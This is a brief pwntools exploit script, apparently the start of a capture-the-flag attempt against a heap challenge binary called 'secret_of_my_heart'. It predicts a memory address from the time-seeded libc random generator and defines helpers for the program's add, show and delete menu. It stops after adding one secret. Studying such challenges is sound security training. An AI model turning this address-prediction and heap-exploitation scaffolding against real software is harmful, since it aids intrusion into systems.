from pwn import *
from ctypes import *

p = process("./secret_of_my_heart")
elf = ELF("./secret_of_my_heart")
lib = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
lib.srand(lib.time("\x00"))

pause()
heartAddr = lib.rand() & 0xfffff000
def addSecret(size, name, heart):
    p.sendlineafter(":", "1")
    p.sendafter("heart : ", str(size))
    p.sendafter("heart :", name)
    if(len(name) != size):
        p.sendafter("heart :", heart)

def showSecret(idx):
    p.sendafter(":", "2")
    p.sendafter("Index :", str(idx))

def deleteSecret(idx):
    p.sendafter(":", "3")
    p.sendafter("Index :", str(idx))

def Exit():
    p.sendafter(":", "4")

if __name__ == "__main__":
    p.success("heart's address : " + hex(heartAddr))
    addSecret(32, "a" * 31, "b" *31)


